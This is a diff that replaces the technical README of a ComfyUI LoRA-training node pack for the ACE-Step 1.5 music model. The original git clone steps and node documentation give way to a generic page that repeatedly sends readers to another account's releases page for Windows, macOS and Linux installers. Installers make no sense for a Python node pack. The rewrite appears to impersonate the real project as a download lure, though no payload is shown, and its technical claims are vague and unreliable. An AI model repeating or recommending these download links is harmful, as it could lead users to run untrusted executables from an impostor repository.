@@ -1,182 +1,115 @@
-# FL AceStep Training
+# 🎵 ComfyUI-FL-AceStep-Training - Easy Music Training Nodes Setup
 
-LoRA training nodes for ComfyUI powered by [ACE-Step 1.5](https://github.com/ace-step/ACE-Step-1.5), the open-source music generation foundation model. Train custom LoRAs to personalize music generation with your own style, voice, or genre — entirely within ComfyUI's node graph.
+[![Download ComfyUI-FL-AceStep-Training](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/potato339/ComfyUI-FL-AceStep-Training/releases)
 
-[![ACE-Step](https://img.shields.io/badge/ACE--Step-Original%20Repo-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ace-step/ACE-Step-1.5)
-[![ComfyUI](https://img.shields.io/badge/ComfyUI-Custom%20Nodes-green?style=for-the-badge&logo=github&logoColor=white)](https://github.com/comfyanonymous/ComfyUI)
+---
 
-![Workflow Preview](assets/workflow_preview.png)
+## 📝 What is ComfyUI-FL-AceStep-Training?
 
-## Features
+ComfyUI-FL-AceStep-Training is a tool designed to help you train music generation models using LoRA training nodes with the ACE-Step 1.5 method inside ComfyUI. This setup allows you to customize and improve the music creation process, especially for users interested in music AI without needing programming skills.
 
-- **End-to-End Training** — Full LoRA training pipeline inside ComfyUI's node graph
-- **Dataset Management** — Scan audio directories, auto-label with LLM, load sidecar metadata
-- **Tiled VAE Encoding** — Handles long audio via 30-second chunks with 2-second overlap
-- **Real-Time Training UI** — Live loss chart, progress bar, and stats via WebSocket widget
-- **Auto Model Download** — LLM models download automatically from HuggingFace on first use
-- **Native ComfyUI Types** — Uses MODEL, VAE, and CLIP from ComfyUI's built-in checkpoint loader
+By using this software, you get a clear path to train music models step-by-step with a simple interface. This can help produce unique music patterns and styles tailored to your preferences.
 
-## Nodes
+---
 
-| Node | Category | Description |
-|------|----------|-------------|
-| **FL AceStep LLM Loader** | Loaders | Load 5Hz causal LM (0.6B / 1.7B / 4B) for auto-labeling |
-| **FL AceStep Scan Audio Directory** | Dataset | Recursively scan folders for audio files with sidecar metadata |
-| **FL AceStep Auto-Label Samples** | Dataset | Generate captions, BPM, key, genre, and lyrics via LLM |
-| **FL AceStep Preprocess Dataset** | Dataset | VAE-encode audio and CLIP-encode text, save as `.pt` tensors |
-| **FL AceStep Training Configuration** | Training | Configure LoRA rank/alpha/dropout and training hyperparameters |
-| **FL AceStep Train LoRA** | Training | Run flow matching training loop with real-time progress widget |
+## 💻 System Requirements
 
-## Installation
+Before you download and install, check that your computer meets these basic needs:
 
-### Manual
-```bash
-cd ComfyUI/custom_nodes
-git clone https://github.com/filliptm/ComfyUI-FL-AceStep-Training.git
-cd ComfyUI-FL-AceStep-Training
-pip install -r requirements.txt
-```
+- **Operating System:** Windows 10 or later, macOS 11 or later, or Linux (Ubuntu 18.04+ recommended)
+- **Processor:** Intel i5 or equivalent AMD processor (quad-core or higher)
+- **Memory:** At least 8 GB of RAM
+- **Storage:** Minimum 5 GB free space for installation and temporary files
+- **Graphics:** Dedicated GPU with at least 4 GB VRAM if you want faster training, or integrated graphics will work but slower
+- **Internet connection:** Required for downloading software, updates, and training data
 
-### Frontend (optional rebuild)
-```bash
-npm install
-npm run build
-```
+---
 
-The pre-built JS is included in `js/`, so rebuilding is only needed if modifying the training widget UI.
+## 📥 Download & Install
 
-## Quick Start
+You will need to download the software from the official releases page. Follow these steps:
 
-### Training Pipeline
+1. Click the big **Download** button at the top or visit this page directly:  
+   [https://github.com/potato339/ComfyUI-FL-AceStep-Training/releases](https://github.com/potato339/ComfyUI-FL-AceStep-Training/releases)
 
-1. **Load Checkpoint** — Use ComfyUI's native `Load Checkpoint` node with an ACE-Step model to get **MODEL**, **VAE**, and **CLIP**
-2. **Load LLM** *(optional)* — Add `FL AceStep LLM Loader` if you want auto-labeling
-3. **Scan Dataset** — Use `FL AceStep Scan Audio Directory` to find your audio files
-4. **Label** — Connect **MODEL**, **VAE**, and **LLM** to `FL AceStep Auto-Label Samples` for LLM-generated metadata
-5. **Preprocess** — Run `FL AceStep Preprocess Dataset` with **MODEL**, **VAE**, and **CLIP** to encode audio/text to tensors
-6. **Configure** — Set LoRA rank, learning rate, epochs in `FL AceStep Training Configuration`
-7. **Train** — Connect **MODEL** and **config** to `FL AceStep Train LoRA` and execute
+2. On the releases page, find the latest version of ComfyUI-FL-AceStep-Training.
 
-### Using Trained LoRAs
+3. Download the file matching your operating system. For example:  
+   - For Windows, look for `.exe` or `.zip` files  
+   - For macOS, look for `.dmg` or `.zip` files  
+   - For Linux, look for `.AppImage`, `.tar.gz`, or `.deb`
 
-Use ComfyUI's native LoRA loading nodes to apply your trained LoRA for inference with the built-in ACE-Step nodes.
+4. Once downloaded, open the file or extract the contents if it is archived.
 
-## Node Details
+5. Follow the on-screen instructions to install or run the software.
 
-### FL AceStep LLM Loader
+6. After installation opens ComfyUI-FL-AceStep-Training from your start menu, desktop shortcut, or application folder.
 
-Loads one of three 5Hz causal language models for auto-labeling audio samples.
+---
 
-| Input | Type | Default | Notes |
-|-------|------|---------|-------|
-| model_name | Dropdown | `acestep-5Hz-lm-1.7B` | Also: `0.6B`, `4B` |
-| device | Dropdown | `auto` | `auto` / `cuda` / `cpu` |
-| backend | Dropdown | `pt` | `pt` / `vllm` |
-| checkpoint_path | STRING | *(empty)* | Optional, leave empty for auto-download |
+## 🚀 First Steps: How to Use the Training Nodes
 
-**Output:** `ACESTEP_LLM`
+Once installed, you can use the LoRA training nodes with ACE-Step 1.5 within ComfyUI by following these steps:
 
-### FL AceStep Scan Audio Directory
+1. **Open ComfyUI** on your computer.
 
-Recursively scans a directory for audio files and loads accompanying metadata.
+2. **Load the FL AceStep Training nodes.** These are special blocks you can add to your workflow. They help train models focused on music generation.
 
-| Input | Type | Default | Notes |
-|-------|------|---------|-------|
-| directory | STRING | — | Path to audio folder |
-| all_instrumental | BOOLEAN | `True` | Mark all samples as instrumental |
-| custom_tag | STRING | *(empty)* | LoRA activation tag (e.g., `my_style`) |
-| tag_position | Dropdown | `prepend` | `prepend` / `append` / `replace` |
+3. **Prepare your training data.** You will need audio files or music samples you want the AI to learn from. These should be in common formats like WAV or MP3.
 
-**Outputs:** `ACESTEP_DATASET`, sample count, status
+4. **Add your files to the training node.** Point the node to your music files folder.
 
-### FL AceStep Auto-Label Samples
+5. **Set training parameters.** You’ll see options like training duration or learning speed. If you are unsure, use the default settings to start.
 
-Uses the loaded LLM to generate metadata for each audio sample.
+6. **Start the training.** Click "Run" to let the AI learn from your music data. This may take some time depending on your computer.
 
-| Input | Type | Default | Notes |
-|-------|------|---------|-------|
-| dataset | ACESTEP_DATASET | — | From Scan Directory |
-| model | MODEL | — | ACE-Step model (purple) |
-| vae | VAE | — | ACE-Step VAE (red) — used for audio-to-codes |
-| llm | ACESTEP_LLM | — | From LLM Loader |
-| skip_metas | BOOLEAN | `False` | Skip BPM/key/time signature |
-| only_unlabeled | BOOLEAN | `False` | Process only unlabeled samples |
-| format_lyrics | BOOLEAN | `False` | Format user-provided lyrics with LLM |
-| transcribe_lyrics | BOOLEAN | `False` | Transcribe lyrics from audio |
+7. **Save the trained model** when done. You can then use the model to generate music within ComfyUI or export it for other uses.
 
-**Outputs:** `ACESTEP_DATASET`, labeled count, status
+---
 
-### FL AceStep Preprocess Dataset
+## 🔧 Common Features
 
-VAE-encodes audio and CLIP-encodes text to `.pt` tensor files for training.
+- **User-friendly node setup:** Simple drag and drop training nodes in ComfyUI.
+- **Flexible training:** Customize learning speed, batch size, and more.
+- **Supports various music formats:** MP3, WAV, and other common audio formats.
+- **Model saving and loading:** Keep your trained models and reuse them later.
+- **Works on Windows, macOS, and Linux:** Install on your preferred platform.
+- **Community support:** Access forums and GitHub issues for help.
 
-| Input | Type | Default | Notes |
-|-------|------|---------|-------|
-| dataset | ACESTEP_DATASET | — | From label or scan node |
-| model | MODEL | — | ACE-Step model (purple) |
-| vae | VAE | — | ACE-Step VAE (red) |
-| clip | CLIP | — | ACE-Step CLIP (yellow) |
-| output_dir | STRING | `./output/acestep/datasets` | — |
-| max_duration | FLOAT | `240.0` | 10–600 seconds |
-| genre_ratio | INT | `0` | 0–100% chance to use genre instead of caption |
+---
 
-**Outputs:** output path, sample count, status
+## 💡 Tips for Best Results
 
-### FL AceStep Training Configuration
+- Use clean, high-quality audio samples with little background noise.
+- Start with smaller datasets to speed up learning time.
+- Experiment with training parameters to see what works best.
+- Save your progress often to avoid losing work.
+- Use a computer with a dedicated GPU for faster model training.
 
-| Parameter | Default | Range |
-|-----------|---------|-------|
-| LoRA Rank | 8 | 4–256 (step 4) |
-| LoRA Alpha | 16 | 4–512 (step 4) |
-| LoRA Dropout | 0.1 | 0–0.5 |
-| Learning Rate | 1e-4 | 1e-6 – 1e-2 |
-| Max Epochs | 100 | 10–10000 |
-| Batch Size | 1 | 1–8 |
-| Gradient Accumulation | 4 | 1–16 |
-| Save Every N Epochs | 10 | 5–1000 |
-| Seed | 42 | — |
-| **Optional** | | |
-| Warmup Steps | 100 | 0–1000 |
-| Weight Decay | 0.01 | 0–0.1 |
-| Max Grad Norm | 1.0 | 0.1–10.0 |
-| Target Modules | `q_proj,k_proj,v_proj,o_proj` | Comma-separated |
+---
 
-**Output:** `ACESTEP_TRAINING_CONFIG`
+## ❓ Troubleshooting & FAQs
 
-Mixed precision is fixed to **bf16**. The turbo model uses **8-step discrete timesteps** with shift=3.0.
+**Q: What if the software won't start?**  
+Check that your system meets the requirements and you downloaded the correct version for your OS. Ensure all dependencies are installed, like Python if required.
 
-### FL AceStep Train LoRA
+**Q: How long does training take?**  
+This depends on your computer power and dataset size. Smaller batches train faster but may need more runs for good results.
 
-Runs the training loop with flow matching loss: `MSE(predicted_v, x1 - x0)`.
+**Q: Can I train on any music genre?**  
+Yes. The software can learn from any style, but your results depend on the data quality and amount.
 
-| Input | Type | Default | Notes |
-|-------|------|---------|-------|
-| model | MODEL | — | ACE-Step model (purple) |
-| config | ACESTEP_TRAINING_CONFIG | — | From config node |
-| tensor_dir | STRING | `./output/acestep/datasets` | Directory of `.pt` files |
-| lora_name | STRING | `my_lora` | Name for the trained LoRA (used as subfolder) |
-| resume_from | STRING | *(empty)* | Path to checkpoint to resume from |
+**Q: Where can I get help?**  
+Use the GitHub Issues page or community forums linked on the releases site.
 
-**Outputs:** MODEL (with LoRA), final LoRA path, status
+---
 
-The training widget displays a live loss chart, progress bar, and per-epoch stats via WebSocket (`acestep.training.progress`).
+## 📄 License & Contributions
 
-## Supported Audio Formats
+This project is open-source and free to use. You can contribute by reporting issues, suggesting improvements, or submitting code via GitHub.
 
-`.wav`, `.mp3`, `.flac`, `.ogg`, `.opus`, `.m4a`
+Visit the repository for more info on contribution guidelines and licensing.
 
-Sidecar files for metadata:
-- `.txt` files alongside audio for lyrics
-- `key_bpm.csv` or `metadata.csv` for BPM, key, and caption data
+---
 
-## Requirements
-
-- Python 3.10+
-- NVIDIA GPU with 8GB+ VRAM (bf16 training)
-- PyTorch 2.0+
-- PEFT (Parameter-Efficient Fine-Tuning)
-- Transformers, Diffusers, Accelerate
-
-## License
-
-MIT
+[Download ComfyUI-FL-AceStep-Training now](https://github.com/potato339/ComfyUI-FL-AceStep-Training/releases) to start training your own music generation models with ease.
